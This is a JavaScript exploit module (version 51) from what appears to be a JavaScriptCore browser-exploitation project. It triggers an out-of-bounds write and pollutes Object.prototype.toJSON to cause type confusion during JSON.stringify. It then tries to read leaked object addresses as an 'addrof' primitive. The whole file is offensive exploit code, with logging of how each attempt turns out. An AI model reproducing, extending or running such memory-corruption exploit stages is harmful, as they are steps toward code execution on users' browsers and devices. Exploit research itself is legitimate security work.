// js/script3/testArrayBufferVictimCrash.mjs (v51_ExploitSelfReference)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Manter, pois pode ser necessário para outras lógicas de leak futura

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR = "OriginalHeisenbug_TypedArrayAddrof_v51_ExploitSelfReference";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v51 = null;
let object_to_leak_B_v51 = null;

let victim_typed_array_ref_v51 = null;
let probe_call_count_v51 = 0;
let all_probe_interaction_details_v51 = [];
let first_call_details_object_ref_v51 = null; // Referência ao C1_details

const PROBE_CALL_LIMIT_V51 = 5;

function toJSON_TA_Probe_ExploitSelfReference() {
    probe_call_count_v51++;
    const call_num = probe_call_count_v51;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v51_ExploitSelfReference",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v51),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v51 && first_call_details_object_ref_v51 !== null),
        payload_A_assigned: false,
        payload_B_assigned: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V51) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v51.push(current_call_details);
            return { recursion_stopped_v51: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v51 = current_call_details; // Guarda a REFERÊNCIA para C1_details
            all_probe_interaction_details_v51.push(current_call_details);

            // --- REMOVIDA A AUTO-REFERÊNCIA explícita para evitar circularidade prematura ---
            // current_call_details.self_ref_to_force_visit = current_call_details;

            return current_call_details; // Retorna o próprio objeto de detalhes da Call #1
        }
        // Caso 2: 'this' é um [object Object] (espera-se que seja o C1_details confuso ou um objeto genérico)
        else if (current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}) Attempting direct leak...`, "vuln");

            // A atribuição ao 'this' pode causar a circularidade
            if (object_to_leak_A_v51) {
                this.payload_A = object_to_leak_A_v51;
                current_call_details.payload_A_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned object_to_leak_A_v51 to this.payload_A.`, "info");
            }
            if (object_to_leak_B_v51) {
                this.payload_B = object_to_leak_B_v51;
                current_call_details.payload_B_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned object_to_leak_B_v51 to this.payload_B.`, "info");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' modified. Keys: ${Object.keys(this).join(',')}`, "info");

            all_probe_interaction_details_v51.push(current_call_details);
            return this; // Retornar o 'this' modificado. Isso é CRÍTICO para a serialização.
        }
        // Caso 3: Outras chamadas (não [object Object]), ou 'this' não é o esperado
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v51.push(current_call_details);
            return { generic_marker_v51: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
        all_probe_interaction_details_v51.push(current_call_details);
        return { error_marker_v51: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_ExploitSelfReference() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (ExploitSelfReference) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR} Init...`;

    probe_call_count_v51 = 0;
    all_probe_interaction_details_v51 = [];
    victim_typed_array_ref_v51 = null;
    first_call_details_object_ref_v51 = null;

    // Inicializando os objetos simples para vazar
    object_to_leak_A_v51 = { marker_A_v51: "LeakMeA_ESR", idA: Date.now() };
    object_to_leak_B_v51 = { marker_B_v51: "LeakMeB_ESR", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let rawStringifyOutput = null; // Captura a string bruta
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof A from payload_A: Default" };
    let addrof_B_result = { success: false, msg: "Addrof B from payload_B: Default" };
    const fillPattern = 0.51515151515151;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v51 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v51.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v51 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ExploitSelfReference, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v51)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v51);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. This is expected if circular structure occurred. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugConfirmed = false;
            const relevantCall = all_probe_interaction_details_v51.find(d => d.this_type === '[object Object]' && d.payload_A_assigned);
            if (relevantCall) {
                heisenbugConfirmed = true;
                logS3(`  EXECUTE: HEISENBUG & PAYLOAD ASSIGNMENT on 'this' of Call #${relevantCall.call_number} CONFIRMED! Type: ${relevantCall.this_type}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Payload Assignment NOT confirmed in any Object 'this' call.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed for leaked payloads...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.payload_A !== undefined) {
                const payload_A_val = stringifyOutput_parsed.payload_A;
                if (typeof payload_A_val === 'number' && payload_A_val !== 0 && !isNaN(payload_A_val)) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_A_result.success = true; addrof_A_result.msg = `SUCCESS: Possible pointer for A: ${pA_int64.toString(true)}`;
                    } else { addrof_A_result.msg = `Payload A is num but not ptr: ${payload_A_val}`; }
                } else if (payload_A_val && payload_A_val.marker_A_v51 === object_to_leak_A_v51.marker_A_v51) {
                    addrof_A_result.msg = `Payload A is object_to_leak_A_v51 directly (not numeric pointer).`;
                } else { addrof_A_result.msg = `Payload A not a useful number or object: ${JSON.stringify(payload_A_val)}`; }

                const payload_B_val = stringifyOutput_parsed.payload_B;
                if (typeof payload_B_val === 'number' && payload_B_val !== 0 && !isNaN(payload_B_val)) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
                    if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000 || (pB_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_B_result.success = true; addrof_B_result.msg = `SUCCESS: Possible pointer for B: ${pB_int64.toString(true)}`;
                    } else { addrof_B_result.msg = `Payload B is num but not ptr: ${payload_B_val}`; }
                } else if (payload_B_val && payload_B_val.marker_B_v51 === object_to_leak_B_v51.marker_B_v51) {
                    addrof_B_result.msg = `Payload B is object_to_leak_B_v51 directly (not numeric pointer).`;
                } else { addrof_B_result.msg = `Payload B not a useful number or object: ${JSON.stringify(payload_B_val)}`; }
            } else if (rawStringifyOutput.includes("circular structure")) { // Verifica o erro de circularidade na string bruta
                addrof_A_result.msg = "Raw stringify output contained 'circular structure' error. Objects were assigned, but not serialized as numbers.";
                addrof_B_result.msg = "Raw stringify output contained 'circular structure' error. Objects were assigned, but not serialized as numbers.";
                logS3(`  Raw stringify output indicates circular structure, but not numeric leak. This is a good sign for control!`, "info");
            } else {
                addrof_A_result.msg = "stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                addrof_B_result.msg = "stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR}: Addr SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V51_ESR} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v51}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v51 = null;
        all_probe_interaction_details_v51 = [];
        probe_call_count_v51 = 0;
        first_call_details_object_ref_v51 = null;
        object_to_leak_A_v51 = null;
        object_to_leak_B_v51 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v51],
        total_probe_calls: probe_call_count_v51,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
}
